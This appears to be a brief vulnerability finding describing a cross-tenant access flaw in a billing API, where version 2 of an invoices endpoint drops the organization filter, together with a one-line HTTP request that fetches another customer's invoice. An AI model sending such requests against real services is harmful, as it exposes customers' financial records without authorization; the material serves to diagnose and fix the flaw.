diagnosis: Under URLPathVersioning, version v1 filters invoices by organization=self.request.user.organization, but version v2 returns all non-deleted CustomerInvoice records globally. An attacker requesting /api/v2/invoices/ can access invoices belonging to any customer.
exploit_request:
GET /api/v2/invoices/10948/ HTTP/1.1
Host: billing.saascloud.com
Authorization: Bearer <customer_jwt>
